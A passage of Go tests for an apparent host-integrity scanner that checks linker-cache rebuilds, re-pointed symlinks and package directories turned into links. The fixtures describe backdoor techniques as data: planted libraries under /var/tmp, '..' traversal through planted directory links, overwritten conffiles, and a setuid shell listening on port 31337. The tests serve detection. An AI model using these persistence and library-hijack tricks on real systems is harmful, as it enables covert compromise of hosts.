		t.Fatalf("could_not_rule_out does not say the modules were left to the host: %q", r.CouldNotRuleOut)
	}
}

// ldconfig rewrites /etc/ld.so.cache on every library update. The change is
// quiet only when the cache lists nothing but what the snapshot's cache
// listed and package files this scan verified.
func TestJudgeLinkerCacheRebuild(t *testing.T) {
	const cache = "/etc/ld.so.cache"
	const key = "snap.file_modified:" + cache
	const ssl, zlink, zfile = "/usr/lib/x86_64-linux-gnu/libssl.so.3", "/usr/lib/x86_64-linux-gnu/libz.so.1", "/usr/lib/x86_64-linux-gnu/libz.so.1.2.13"
	base := func() *model.Collection {
		c := clean()
		c.Files = append(c.Files, file(cache, "cache 1", 0o644), file(ssl, "libssl", 0o644))
		c.Packages.Installed = append(c.Packages.Installed, pkg("libssl3", "3.0.14-1~deb12u2", ssl))
		c.LinkerCache = []string{ssl}
		return c
	}
	// rebuilt is base with new cache bytes listing these paths.
	rebuilt := func(listed ...string) *model.Collection {
		c := base()
		for i := range c.Files {
			if c.Files[i].Path == cache {
				c.Files[i] = file(cache, "cache 2", 0o644)
			}
		}
		c.LinkerCache = listed
		return c
	}
	// withZlib installs zlib1g: the library and the link to it the cache lists.
	withZlib := func(c *model.Collection, content string) pkgverify.FileVerdict {
		lib := file(zfile, content, 0o644)
		c.Files = append(c.Files, lib, model.FileEntry{Path: zlink, Type: "symlink", Target: "libz.so.1.2.13", Mode: 0o120777, MTime: taken, CTime: taken})
		c.Packages.Installed = append(c.Packages.Installed, pkg("zlib1g", "1:1.2.13.dfsg-1", zlink, zfile))
		return pkgverify.FileVerdict{Path: zfile, Package: "zlib1g", Version: "1:1.2.13.dfsg-1", Expected: lib.SHA256, Actual: lib.SHA256, Source: "archive"}
	}
	ranked := func(r *model.Report) *model.Finding { return find(r, key) }

	// Same libraries, new bytes (a newer ldconfig wrote it).
	r := run(rebuilt(ssl), snapOf(base()), archive())
	if f := ranked(r); f != nil {
		t.Errorf("a rebuilt cache listing the same libraries is ranked %q", f.Severity)
	}
	if explained(r, "rebuilt:"+cache) == nil {
		t.Errorf("the rebuilt cache is not shown among the explained items")
	}

	// A newly listed library, reached through its package's link, that this
	// scan verified. The cache spells the path the pre-merge way, and /lib
	// is the link to usr/lib that a merged-/usr machine has.
	usrMerge := model.FileEntry{Path: "/lib", Type: "symlink", Target: "usr/lib", Mode: 0o120777, MTime: taken, CTime: taken}
	c := rebuilt(ssl, "/lib/x86_64-linux-gnu/libz.so.1")
	c.Files = append(c.Files, usrMerge)
	v := withZlib(c, "libz")
	merged := base()
	merged.Files = append(merged.Files, usrMerge)
	if f := ranked(run(c, snapOf(merged), archive(v))); f != nil {
		t.Errorf("a cache that gained a verified packaged library is ranked %q", f.Severity)
	}
	// Without that link (/lib not recorded, or a directory of its own) the
	// /usr spelling says nothing about a /lib path.
	c = rebuilt(ssl, "/lib/x86_64-linux-gnu/libz.so.1")
	v = withZlib(c, "libz")
	if f := ranked(run(c, snapOf(base()), archive(v))); f == nil || f.Severity != model.SevBackdoor {
		t.Errorf("/lib path with no /lib link in the inventory: want a backdoor sign, got %+v", f)
	}
	c = rebuilt(ssl, "/lib/x86_64-linux-gnu/ossl/libz.so.1.2.13")
	v = withZlib(c, "libz")
	c.Files = append(c.Files,
		model.FileEntry{Path: "/lib", Type: "dir", Mode: 0o40755, MTime: taken, CTime: taken},
		model.FileEntry{Path: "/lib/x86_64-linux-gnu", Type: "dir", Mode: 0o40755, MTime: taken, CTime: taken},
		model.FileEntry{Path: "/lib/x86_64-linux-gnu/ossl", Type: "symlink", Target: "/opt/q", Mode: 0o120777, MTime: taken, CTime: taken})
	if f := ranked(run(c, snapOf(base()), archive(v))); f == nil || f.Severity != model.SevBackdoor {
		t.Errorf("non-merged machine, /lib path through a planted link: want a backdoor sign, got %+v", f)
	}

	// The kernel resolves links physically. libq.so.1 -> qdir/../libz.so.1.2.13
	// reads as the verified library, but qdir is a link to /opt/q/a/b, so
	// ".." is /opt/q/a and the loader maps /opt/q/a/libz.so.1.2.13.
	const multi = "/usr/lib/x86_64-linux-gnu"
	sym := func(p, target string) model.FileEntry {
		return model.FileEntry{Path: p, Type: "symlink", Target: target, Mode: 0o120777, MTime: changed, CTime: changed}
	}
	for name, extra := range map[string][]model.FileEntry{
		"dot-dot through a planted directory link": {sym(multi+"/libq.so.1", "qdir/../libz.so.1.2.13"), sym(multi+"/qdir", "/opt/q/a/b")},
		"the same, the evil file inventoried": {sym(multi+"/libq.so.1", "qdir/../libz.so.1.2.13"), sym(multi+"/qdir", "/opt/q/a/b"),
			{Path: "/opt/q/a/b", Type: "dir", Mode: 0o40755}, file("/opt/q/a/libz.so.1.2.13", "evil", 0o644)},
		"relative directory link":      {sym(multi+"/libq.so.1", "up/../libz.so.1.2.13"), sym(multi+"/up", "../../../opt/q/a/b")},
		"link loop":                    {sym(multi+"/libq.so.1", "libr.so.1"), sym(multi+"/libr.so.1", "libq.so.1")},
		"link straight out (control)":  {sym(multi+"/libq.so.1", "/opt/q/a/libz.so.1.2.13")},
		"file in the middle of a path": {sym(multi+"/libq.so.1", "libz.so.1.2.13/../libz.so.1.2.13")},
	} {
		c = rebuilt(ssl, multi+"/libq.so.1")
		v = withZlib(c, "libz")
		c.Files = append(c.Files, extra...)
		rep := run(c, snapOf(base()), archive(v))
		if f := ranked(rep); f == nil || f.Severity != model.SevBackdoor {
			t.Errorf("%s: want a backdoor sign for the changed cache, got %+v", name, f)
		}
		if explained(rep, "rebuilt:"+cache) != nil {
			t.Errorf("%s: the rebuild is explained", name)
		}
	}
	// Control: the same kind of link to the verified library itself.
	c = rebuilt(ssl, multi+"/libq.so.1")
	v = withZlib(c, "libz")
	c.Files = append(c.Files, sym(multi+"/libq.so.1", "./libz.so.1"))
	if f := ranked(run(c, snapOf(base()), archive(v))); f != nil {
		t.Errorf("a link to the verified library: ranked %q", f.Severity)
	}

	// The same library owned by the package but not verified in this scan,
	// and verified as something other than what is there now.
	c = rebuilt(ssl, zlink)
	withZlib(c, "libz")
	if f := ranked(run(c, snapOf(base()), archive())); f == nil || f.Severity != model.SevBackdoor {
		t.Errorf("owned but unverified library: want a backdoor sign, got %+v", f)
	}
	c = rebuilt(ssl, zlink)
	v = withZlib(c, "libz, replaced")
	v.Actual = h("libz")
	if f := ranked(run(c, snapOf(base()), archive(v))); f == nil || f.Severity != model.SevBackdoor {
		t.Errorf("library changed after verification: want a backdoor sign, got %+v", f)
	}

	// A package's configuration file overwritten with a library and listed in
	// the cache: package verification never compares conffiles, so owning the
	// path explains nothing, whichever way the path is spelled.
	for _, listed := range []string{"/etc/openssl/libevil.so", "/usr/lib/ssl/libevil.so", "/lib/ssl/libevil.so"} {
		conf := listed
		if conf == "/lib/ssl/libevil.so" {
			conf = "/usr/lib/ssl/libevil.so"
		}
		c = rebuilt(ssl, listed)
		lib := file(conf, "elf", 0o644)
		c.Files = append(c.Files, lib)
		for i := range c.Packages.Installed {
			if c.Packages.Installed[i].Name == "openssl" {
				c.Packages.Installed[i].Files = append(c.Packages.Installed[i].Files, conf)
				c.Packages.Installed[i].Conffiles = map[string]string{conf: "0123"}
			}
		}
		// Even a verdict that calls the file verified does not count.
		cv := pkgverify.FileVerdict{Path: conf, Package: "openssl", Version: "3.0.14-1~deb12u2", Expected: lib.SHA256, Actual: lib.SHA256, Source: "archive"}
		rep := run(c, snapOf(base()), archive(cv))
		if f := ranked(rep); f == nil || f.Severity != model.SevBackdoor {
			t.Errorf("conffile %s listed in the cache: want a backdoor sign, got %+v", listed, f)
		}
		if explained(rep, "rebuilt:"+cache) != nil {
			t.Errorf("conffile %s listed in the cache: the rebuild is explained", listed)
		}
	}

	// A newly listed library that no package owns, a link that leads to one,
	// and a cache that could not be parsed.
	loop := rebuilt(ssl, zlink)
	loop.Files = append(loop.Files, model.FileEntry{Path: zlink, Type: "symlink", Target: "/var/tmp/.x/libz.so.1", Mode: 0o120777})
	unparsed := rebuilt()
	unparsed.LinkerCache = nil
	for name, c := range map[string]*model.Collection{
		"unowned library":      rebuilt(ssl, "/var/tmp/.x/libssl.so.3"),
		"only unowned entries": rebuilt("/usr/local/lib/libsync.so"),
		"link to an unowned":   loop,
		"cache not parsed":     unparsed,
	} {
		f := ranked(run(c, snapOf(base()), archive()))
		if f == nil || f.Severity != model.SevBackdoor {
			t.Errorf("%s: want a backdoor sign for the changed cache, got %+v", name, f)
		}
	}

	// A snapshot from before telltale recorded the cache: every listed
	// library has to be verified now.
	old := base()
	old.LinkerCache = nil
	sslv := pkgverify.FileVerdict{Path: ssl, Package: "libssl3", Version: "3.0.14-1~deb12u2", Expected: h("libssl"), Actual: h("libssl"), Source: "archive"}
	if f := ranked(run(rebuilt(ssl), snapOf(old), archive(sslv))); f != nil {
		t.Errorf("old snapshot, verified libraries only: ranked %q", f.Severity)
	}
	if f := ranked(run(rebuilt(ssl), snapOf(old), archive())); f == nil || f.Severity != model.SevBackdoor {
		t.Errorf("old snapshot, library not verified: want a backdoor sign, got %+v", f)
	}
}

// /etc/mtab re-pointed between the two names of the kernel's mount table is
// what package upgrades do; pointed anywhere else it is still a bad link.
func TestJudgeMtabLinkToTheMountTable(t *testing.T) {
	link := func(target string) model.FileEntry {
		return model.FileEntry{Path: "/etc/mtab", Type: "symlink", Target: target, Mode: 0o120777, MTime: taken, CTime: taken}
	}
	scan := func(from, to string) *model.Finding {
		old, cur := clean(), clean()
		old.Files = append(old.Files, link(from))
		cur.Files = append(cur.Files, link(to))
		return find(run(cur, snapOf(old), archive()), "snap.file_modified:/etc/mtab")
	}
	for _, to := range []string{"../proc/self/mounts", "/proc/self/mounts"} {
		if f := scan("/proc/mounts", to); f == nil || f.Severity != model.SevNote {
			t.Errorf("/etc/mtab -> %s: want a note, got %+v", to, f)
		}
	}
	for _, to := range []string{"/proc/1/root/mounts", "/var/lib/x/mounts", "/tmp/m"} {
		if f := scan("/proc/mounts", to); f == nil || f.Severity != model.SevBackdoor {
			t.Errorf("/etc/mtab -> %s: want a backdoor sign, got %+v", to, f)
		}
	}
}

// A changed link is judged by where the kernel ends up, not by what its text
// cleans to: "/opt/q/../../usr/..." with /opt/q a link into /var/tmp reads as
// a path in /usr and opens a file under /var/tmp.
func TestJudgeChangedLinkIsJudgedPhysically(t *testing.T) {
	sym := func(p, target string, when time.Time) model.FileEntry {
		return model.FileEntry{Path: p, Type: "symlink", Target: target, Mode: 0o120777, MTime: when, CTime: when}
	}
	dir := func(p string) model.FileEntry {
		return model.FileEntry{Path: p, Type: "dir", Mode: 0o40755, MTime: taken, CTime: taken}
	}
	const trick = "/opt/q/../../usr/bin/mawk"
	q := []model.FileEntry{dir("/opt"), sym("/opt/q", "/var/tmp/x/a", taken)}

	// An unowned link that changed (/etc/alternatives/awk).
	const alt = "/etc/alternatives/awk"
	old := clean()
	old.Files = append(old.Files, dir("/etc/alternatives"), sym(alt, "/usr/bin/mawk", taken), file("/usr/bin/mawk", "mawk", 0o755))
	for name, tc := range map[string]struct {
		extra []model.FileEntry
		want  model.Severity
		why   string
	}{
		"control: another program in /usr":          {[]model.FileEntry{sym(alt, "/usr/bin/ls", changed)}, model.SevNote, ""},
		"control: straight into /var/tmp":           {[]model.FileEntry{sym(alt, "/var/tmp/x/usr/bin/mawk", changed)}, model.SevBackdoor, "/var/tmp"},
		"dot-dot through a link, not recorded":      {[]model.FileEntry{sym(alt, trick, changed)}, model.SevBackdoor, "cannot be told"},
		"dot-dot through a link into /var/tmp":      {append([]model.FileEntry{sym(alt, trick, changed)}, q...), model.SevBackdoor, "cannot be told"},
		"dot-dot through a link into a dot dir":     {[]model.FileEntry{sym(alt, trick, changed), dir("/opt"), sym("/opt/q", "/root/.h/x/a", taken)}, model.SevBackdoor, "cannot be told"},
		"through a link into /var/tmp, no dot-dot":  {append([]model.FileEntry{sym(alt, "/opt/q/mawk", changed)}, q...), model.SevBackdoor, "/var/tmp"},
		"through a link into a dot dir, no dot-dot": {[]model.FileEntry{sym(alt, "/opt/q/mawk", changed), dir("/opt"), sym("/opt/q", "/srv/.h/x", taken)}, model.SevBackdoor, "hidden"},
		"dot-dot inside real directories":           {[]model.FileEntry{sym(alt, "/usr/bin/../bin/ls", changed)}, model.SevNote, ""},
		"link loop":                                 {[]model.FileEntry{sym(alt, "/etc/alternatives/awk", changed)}, model.SevBackdoor, "cannot be told"},
	} {
		c := clean()
		c.Files = append(c.Files, dir("/etc/alternatives"), file("/usr/bin/mawk", "mawk", 0o755))
		c.Files = append(c.Files, tc.extra...)
		f := find(run(c, snapOf(clone(old)), archive()), "snap.file_modified:"+alt)
		if f == nil || f.Severity != tc.want || !strings.Contains(f.Why, tc.why) {
			t.Errorf("%s: want %q mentioning %q, got %+v", name, tc.want, tc.why, f)
		}
	}

	// A new unowned link (/usr/local/bin/sudo).
	const nl = "/usr/local/bin/sudo"
	for name, tc := range map[string]struct {
		extra []model.FileEntry
		want  model.Severity
	}{
		"control: straight into /var/tmp":      {[]model.FileEntry{sym(nl, "/var/tmp/x/sudo", changed)}, model.SevBackdoor},
		"dot-dot through a link, not recorded": {[]model.FileEntry{sym(nl, "/opt/q/../../usr/bin/sudo", changed)}, model.SevBackdoor},
		"dot-dot through a link into /var/tmp": {append([]model.FileEntry{sym(nl, "/opt/q/../../usr/bin/sudo", changed)}, q...), model.SevBackdoor},
	} {
		c := clean()
		c.Files = append(c.Files, dir("/usr/local"), dir("/usr/local/bin"))
		c.Files = append(c.Files, tc.extra...)
		if f := find(run(c, snapOf(clean()), archive()), "snap.file_added:"+nl); f == nil || f.Severity != tc.want {
			t.Errorf("new link, %s: want %q, got %+v", name, tc.want, f)
		}
	}
}

// A package's own link re-pointed during that package's upgrade is part of
// the upgrade only when it still leads to a file of that package (or of
// another package that changed). The reviewer's case: zlib1g's soname link
// aimed, through a directory link, at a copy under /var/tmp.
func TestJudgePackageLinkFoldsOnlyOntoPackageFiles(t *testing.T) {
	const zlink, zfile = "/usr/lib/x86_64-linux-gnu/libz.so.1", "/usr/lib/x86_64-linux-gnu/libz.so.1.2.13"
	const newVersion = "1:1.2.13.dfsg-1+deb12u1"
	sym := func(p, target string, when time.Time) model.FileEntry {
		return model.FileEntry{Path: p, Type: "symlink", Target: target, Mode: 0o120777, MTime: when, CTime: when}
	}
	mk := func(version, content string, extra ...model.FileEntry) *model.Collection {
		c := clean()
		c.Files = append(c.Files, file(zfile, content, 0o644))
		c.Files = append(c.Files, extra...)
		c.Packages.Installed = append(c.Packages.Installed, pkg("zlib1g", version, zlink, zfile))
		return c
	}
	snapC := func() *model.Snapshot {
		return snapOf(mk("1:1.2.13.dfsg-1", "zlib old", sym(zlink, "libz.so.1.2.13", taken)))
	}
	v := verdict(zfile, "zlib1g", newVersion, "zlib new")
	q := []model.FileEntry{{Path: "/opt", Type: "dir", Mode: 0o40755, MTime: taken, CTime: taken}, sym("/opt/q", "/var/tmp/x/a", taken)}
	const trick = "/opt/q/../../usr/lib/x86_64-linux-gnu/libz.so.1.2.13"
	inUpgrade := func(r *model.Report) bool {
		g := explained(r, "explained:zlib1g")
		return g != nil && hasEvidencePath(g, zlink)
	}

	// Re-pointed at the package's own library, spelled differently: part of
	// the upgrade.
	r := run(mk(newVersion, "zlib new", sym(zlink, "./libz.so.1.2.13", changed)), snapC(), archive(v))
	if !inUpgrade(r) || find(r, "snap.file_modified:"+zlink) != nil {
		t.Errorf("link to the package's own file: not folded into the upgrade: %v", keys(r))
	}
	for name, extra := range map[string][]model.FileEntry{
		"dot-dot through a link into /var/tmp": append([]model.FileEntry{sym(zlink, trick, changed)}, q...),
		"dot-dot through a link, not recorded": {sym(zlink, trick, changed)},
		"straight into /var/tmp":               {sym(zlink, "/var/tmp/x/libz.so", changed)},
		"a file no package owns, in /usr":      {sym(zlink, "/usr/lib/x86_64-linux-gnu/libevil.so", changed), file("/usr/lib/x86_64-linux-gnu/libevil.so", "evil", 0o644)},
	} {
		// With the upgrade, and with no package change at all.
		for _, version := range []string{newVersion, "1:1.2.13.dfsg-1"} {
			content := "zlib new"
			res := archive(v)
			if version != newVersion {
				content, res = "zlib old", archive()
			}
			r := run(mk(version, content, extra...), snapC(), res)
			if inUpgrade(r) {
				t.Errorf("%s (%s): folded into the upgrade", name, version)
			}
			f := find(r, "snap.file_modified:"+zlink)
			if f == nil {
				t.Errorf("%s (%s): no finding for the link: %v", name, version, keys(r))
				continue
			}
			if name != "a file no package owns, in /usr" && f.Severity != model.SevBackdoor {
				t.Errorf("%s (%s): the link is %q, want a backdoor sign", name, version, f.Severity)
			}
		}
	}
}

// Ownership is by where a file is: with /opt a link to /data/opt, the
// package-link note is ranked with the verdict and the checksum dpkg keeps
// under its own spelling of the path.
func TestPackageLinkBehindALinkedDirectory(t *testing.T) {
	const l, lit, phys = "/etc/cron.daily/google-chrome", "/opt/google/chrome/cron/google-chrome", "/data/opt/google/chrome/cron/google-chrome"
	mk := func(md5 string) *model.Collection {
		c := clean()
		c.Persist = append(c.Persist, model.PersistFile{Path: l, Kind: model.PersistKindCron, Mode: 0o120777, Lines: []string{lit}})
		script := file(phys, "job", 0o755)
		script.MD5 = "0123abcd"
		c.Files = append(c.Files, script, model.FileEntry{Path: "/opt", Type: "symlink", Target: "/data/opt", Mode: 0o120777, MTime: taken, CTime: taken})
		p := pkg("google-chrome-stable", "131.0-1", lit)
		p.LocalMD5 = map[string]string{lit: md5}
		c.Packages.Installed = append(c.Packages.Installed, p)
		return c
	}
	// The machine's own checksum matches the file where it really is.
	if f := find(run(mk("0123abcd"), nil, archive()), "heur.persist_link_pkg:"+l); f == nil || f.Severity != model.SevNote {
		t.Errorf("want the package-link note, got %+v", f)
	}
	// It does not: overwritten.
	r := run(mk("ffff0000"), nil, archive())
	if f := find(r, "heur.persist_link:"+l); f == nil || f.Severity != model.SevBackdoor {
		t.Errorf("checksum mismatch: want a backdoor sign, got %v", keys(r))
	}
	// A mismatch verdict under dpkg's spelling raises it too.
	res := archive()
	res.Mismatch = []pkgverify.FileVerdict{{Path: lit, Package: "google-chrome-stable", Version: "131.0-1", Expected: h("job"), Actual: h("other"), Source: "archive"}}
	r = run(mk("0123abcd"), nil, res)
	if f := find(r, "heur.persist_link:"+l); f == nil || f.Severity != model.SevBackdoor {
		t.Errorf("mismatch verdict: want a backdoor sign, got %v", keys(r))
	}
	// So does one under the path the file really has, which is how package
	// verification names a file it reached through a directory link.
	res = archive()
	res.Mismatch = []pkgverify.FileVerdict{{Path: phys, Package: "google-chrome-stable", Version: "131.0-1", Expected: h("job"), Actual: h("other"), Source: "archive"}}
	r = run(mk("0123abcd"), nil, res)
	if f := find(r, "heur.persist_link:"+l); f == nil || f.Severity != model.SevBackdoor {
		t.Errorf("mismatch verdict at the physical path: want a backdoor sign, got %v", keys(r))
	}
	// A verified verdict there keeps the note, whatever the machine's own
	// checksum says, and /opt being a link is a note of its own.
	r = run(mk("ffff0000"), nil, archive(verdict(phys, "google-chrome-stable", "131.0-1", "job")))
	must(t, r, "heur.persist_link_pkg:"+l, model.SevNote)
	must(t, r, "pkg.dir_now_link:/opt", model.SevNote)
}

func symlinkAt(p, target string, when time.Time) model.FileEntry {
	return model.FileEntry{Path: p, Type: "symlink", Target: target, Mode: 0o120777, MTime: when, CTime: when}
}

func dirAt(p string) model.FileEntry {
	return model.FileEntry{Path: p, Type: "dir", Mode: 0o40755, MTime: taken, CTime: taken}
}

// Root moves a package's directory away, leaves a link in its place and
// plants a setuid shell behind it under a name the package lists. A file is
// a package's only under the path dpkg lists it at: the shell and its
// listener stay unowned, and the directory that became a link is reported.
func TestPackageDirectoryLinkDoesNotOwnWhatItLeadsTo(t *testing.T) {
	for _, target := range []string{"/usr/share/evil", "/srv/evil"} {
		c := clean()
		c.Files = append(c.Files, dirAt("/usr/lib"), symlinkAt("/usr/lib/foo", target, taken), file(target+"/helper", "bash 5.2", 0o4755), file(target+"/README", "readme", 0o644))
		c.Packages.Installed = append(c.Packages.Installed, pkg("foo", "1.0-1", "/usr/lib/foo", "/usr/lib/foo/helper", "/usr/lib/foo/README"))
		c.Runtime.Processes = append(c.Runtime.Processes, model.Process{PID: 4242, PPID: 1, UID: 0, Exe: target + "/helper", Comm: "helper", Cmdline: target + "/helper"})
		c.Runtime.Sockets = append(c.Runtime.Sockets, model.Socket{Proto: "tcp", Local: "0.0.0.0:31337", State: "LISTEN", PID: 4242, Listening: true})
		r := run(c, nil, archive())
		must(t, r, "heur.unowned_setuid:"+target+"/helper", model.SevBackdoor)
		if find(r, "heur.unowned_listener:"+target+"/helper") == nil {
			t.Errorf("%s: the listener's program counts as package-owned: %v", target, keys(r))
		}
		must(t, r, "pkg.dir_now_link:/usr/lib/foo", model.SevNote)
	}
}

// The same with a snapshot taken before, and with what package verification
// says about the file really reached.
func TestPackageDirectoryLinkWithSnapshot(t *testing.T) {
	old := clean()
	old.Files = append(old.Files, dirAt("/usr/lib"), dirAt("/usr/lib/foo"), file("/usr/lib/foo/helper", "helper 1.0", 0o755))
	old.Packages.Installed = append(old.Packages.Installed, pkg("foo", "1.0-1", "/usr/lib/foo", "/usr/lib/foo/helper"))
	cur := clone(old)
	cur.Files = slices.DeleteFunc(cur.Files, func(f model.FileEntry) bool { return strings.HasPrefix(f.Path, "/usr/lib/foo") })
	sh := file("/usr/share/evil/helper", "bash 5.2", 0o4755)
	sh.MTime, sh.CTime = changed, changed
	cur.Files = append(cur.Files, symlinkAt("/usr/lib/foo", "/usr/share/evil", changed), sh)
	res := archive()
	res.Mismatch = []pkgverify.FileVerdict{{Path: "/usr/share/evil/helper", Package: "foo", Version: "1.0-1", Expected: h("helper 1.0"), Actual: h("bash 5.2"),
		Reason: "differs from the file in the signed package", Kind: pkgverify.KindContentDiffers, Source: "archive"}}
	r := run(cur, snapOf(old), res)
	must(t, r, "heur.unowned_setuid:/usr/share/evil/helper", model.SevBackdoor)
	must(t, r, "pkg.mismatch:/usr/share/evil/helper", model.SevTampering)
	if f := find(r, "pkg.dir_now_link:/usr/lib/foo"); f == nil {
		t.Errorf("the directory that became a link is not reported: %v", keys(r))
	}
	for _, f := range r.Explained {
		for _, e := range f.Evidence {
			if strings.Contains(e.Path, "evil") {
				t.Errorf("%s explains %s", f.Key, e.Path)
			}
		}
	}
}

// A directory dpkg lists that is now a symbolic link: a note when it leads
// somewhere ordinary on the machine (an admin moved /opt to another disk), a
// backdoor sign when it leads into a temporary or hidden place or nowhere
// that can be followed. The links merged /usr consists of are not reported.
func TestPackageDirectoryNowALink(t *testing.T) {
	const key = "pkg.dir_now_link:"
	for _, tc := range []struct {
		name  string
		files []model.FileEntry
		lists []string
		want  map[string]model.Severity
		quiet []string
	}{
		{"an admin moved /opt", []model.FileEntry{symlinkAt("/opt", "/data/opt", taken), file("/data/opt/google/chrome/chrome", "chrome", 0o755)},
			[]string{"/opt", "/opt/google", "/opt/google/chrome", "/opt/google/chrome/chrome"},
			map[string]model.Severity{"/opt": model.SevNote}, []string{"/opt/google", "/opt/google/chrome"}},
		{"into /var/tmp", []model.FileEntry{symlinkAt("/opt", "/var/tmp/opt", taken), file("/var/tmp/opt/google/chrome/chrome", "chrome", 0o755)},
			[]string{"/opt", "/opt/google", "/opt/google/chrome", "/opt/google/chrome/chrome"},
			map[string]model.Severity{"/opt": model.SevBackdoor}, nil},
		{"into /dev/shm through a second link", []model.FileEntry{dirAt("/usr/lib"), symlinkAt("/usr/lib/foo", "/srv/foo", taken), symlinkAt("/srv/foo", "/dev/shm/foo", taken), dirAt("/dev"), dirAt("/dev/shm"), dirAt("/dev/shm/foo")},
			[]string{"/usr/lib/foo", "/usr/lib/foo/helper"},
			map[string]model.Severity{"/usr/lib/foo": model.SevBackdoor}, nil},
		{"into a hidden directory", []model.FileEntry{dirAt("/usr/lib"), symlinkAt("/usr/lib/foo", "/srv/.cache/foo", taken), file("/srv/.cache/foo/helper", "x", 0o755)},
			[]string{"/usr/lib/foo", "/usr/lib/foo/helper"},
			map[string]model.Severity{"/usr/lib/foo": model.SevBackdoor}, nil},
		{"nowhere that can be followed", []model.FileEntry{dirAt("/usr/lib"), symlinkAt("/usr/lib/foo", "/mnt/gone/foo", taken)},
			[]string{"/usr/lib/foo", "/usr/lib/foo/helper"},
			map[string]model.Severity{"/usr/lib/foo": model.SevBackdoor}, nil},
		{"a link below a moved directory", []model.FileEntry{symlinkAt("/opt", "/data/opt", taken), symlinkAt("/data/opt/google", "/tmp/g", taken), file("/tmp/g/chrome/chrome", "chrome", 0o755)},
			[]string{"/opt", "/opt/google", "/opt/google/chrome", "/opt/google/chrome/chrome"},
			map[string]model.Severity{"/opt": model.SevNote, "/opt/google": model.SevBackdoor}, nil},
		{"merged /usr", []model.FileEntry{symlinkAt("/bin", "usr/bin", taken), symlinkAt("/lib", "usr/lib", taken), symlinkAt("/lib64", "/usr/lib64", taken), dirAt("/usr/lib"), dirAt("/usr/lib64"), file("/usr/bin/ls", "ls 9.1", 0o755)},
			[]string{"/bin", "/bin/ls", "/lib", "/lib/x.so", "/lib64", "/lib64/ld.so"},
			nil, []string{"/bin", "/lib", "/lib64"}},
		{"/lib pointed somewhere else", []model.FileEntry{symlinkAt("/lib", "/var/tmp/lib", taken), file("/var/tmp/lib/x.so", "x", 0o644)},
			[]string{"/lib", "/lib/x.so"},
			map[string]model.Severity{"/lib": model.SevBackdoor}, nil},
		{"into a user's runtime directory", []model.FileEntry{dirAt("/usr/lib"), symlinkAt("/usr/lib/foo", "/run/user/1000/foo", taken), file("/run/user/1000/foo/helper", "x", 0o755)},
			[]string{"/usr/lib/foo", "/usr/lib/foo/helper"},
			map[string]model.Severity{"/usr/lib/foo": model.SevBackdoor}, nil},
		{"into /run/lock", []model.FileEntry{dirAt("/usr/lib"), symlinkAt("/usr/lib/foo", "/run/lock/foo", taken), file("/run/lock/foo/helper", "x", 0o755)},
			[]string{"/usr/lib/foo", "/usr/lib/foo/helper"},
			map[string]model.Severity{"/usr/lib/foo": model.SevBackdoor}, nil},
		{"elsewhere under /run is not a temporary place", []model.FileEntry{dirAt("/usr/lib"), symlinkAt("/usr/lib/foo", "/run/foo", taken), file("/run/foo/helper", "x", 0o755)},
			[]string{"/usr/lib/foo", "/usr/lib/foo/helper"},
			map[string]model.Severity{"/usr/lib/foo": model.SevNote}, nil},
		{"a link the package ships as its last component", []model.FileEntry{dirAt("/usr/lib"), dirAt("/usr/lib/jvm"), dirAt("/usr/lib/jvm/java-17"), symlinkAt("/usr/lib/jvm/default-java", "java-17", taken)},
			[]string{"/usr/lib/jvm", "/usr/lib/jvm/default-java", "/usr/lib/jvm/java-17"},
			nil, []string{"/usr/lib/jvm/default-java"}},
	} {
		c := clean()
		c.Files = append(c.Files, tc.files...)
		c.Packages.Installed = append(c.Packages.Installed, pkg("vendor", "1.0-1", tc.lists...))
		r := run(c, nil, archive())
		for p, sev := range tc.want {
			f := find(r, key+p)
			if f == nil || f.Severity != sev {
				t.Errorf("%s: %s: want %q, got %+v", tc.name, p, sev, f)
				continue
			}
			if !strings.Contains(f.Fix, "'"+p+"'") {
				t.Errorf("%s: the fix does not quote the path: %s", tc.name, f.Fix)
			}
		}
		for _, p := range tc.quiet {
			absent(t, r, key+p)
		}
	}
	// The path in the fix is quoted like any machine value.
	c := clean()
	const odd = "/opt/it's here"
	c.Files = append(c.Files, dirAt("/opt"), symlinkAt(odd, "/var/tmp/x", taken))
	c.Packages.Installed = append(c.Packages.Installed, pkg("vendor", "1.0-1", odd, odd+"/f"))
	if f := find(run(c, nil, archive()), key+odd); f == nil || !strings.Contains(f.Fix, escape.ShellQuote(odd)) || strings.Contains(f.Fix, " "+odd) {
		t.Errorf("fix for an odd name: %+v", f)
	}
}

// A changed link whose target the inventory cannot follow to the end is not
// judged by the text beyond the last recorded path: /run/systemd/q/x reads as
// a system path, and q may be a link into /var/tmp. Unless the collector
// looked and found the next name absent, a path that stops inside the system
// directories leads nobody knows where.
func TestChangedLinkPastTheInventoryEdge(t *testing.T) {
	const alt = "/etc/alternatives/awk"
	const snapKey = "snap.file_modified:" + alt
	old := clean()
	old.Files = append(old.Files, dirAt("/etc/alternatives"), symlinkAt(alt, "/usr/bin/mawk", taken), file("/usr/bin/mawk", "mawk", 0o755))
	for _, tc := range []struct {
		name    string
		target  string
		extra   []model.FileEntry
		missing []string
		sev     model.Severity
		why     string
	}{
		{"through /run/systemd, nothing of /run recorded", "/run/systemd/q/mawk", nil, nil, model.SevBackdoor, "cannot be told"},
		{"control: /run/systemd/q recorded as a link into /var/tmp", "/run/systemd/q/mawk",
			[]model.FileEntry{dirAt("/run"), dirAt("/run/systemd"), symlinkAt("/run/systemd/q", "/var/tmp/x", taken)}, nil, model.SevBackdoor, "points into /var/tmp"},
		{"control: followed to a file in /run/systemd", "/run/systemd/q/mawk",
			[]model.FileEntry{dirAt("/run"), dirAt("/run/systemd"), dirAt("/run/systemd/q"), file("/run/systemd/q/mawk", "mawk", 0o755)}, nil, model.SevNote, ""},
		{"into a mount under /usr the scan stayed out of", "/usr/lib/q/mawk", []model.FileEntry{dirAt("/usr/lib"), dirAt("/usr/lib/q")}, nil, model.SevBackdoor, "cannot be told"},
		{"anywhere else under /run", "/run/q/mawk", nil, nil, model.SevBackdoor, "cannot be told"},
		{"a file the collector found missing", "/usr/bin/gawk", nil, []string{"/usr/bin/gawk"}, model.SevNote, ""},
		{"a directory the collector found missing", "/usr/share/man/man1/awk.1.gz", []model.FileEntry{dirAt("/usr/share")}, []string{"/usr/share/man"}, model.SevNote, ""},
		{"unfollowed into /var/tmp as written", "/var/tmp/z/mawk", nil, nil, model.SevBackdoor, "points into /var/tmp"},
		{"unfollowed into a hidden directory as written", "/usr/lib/.q/mawk", nil, nil, model.SevBackdoor, "hidden"},
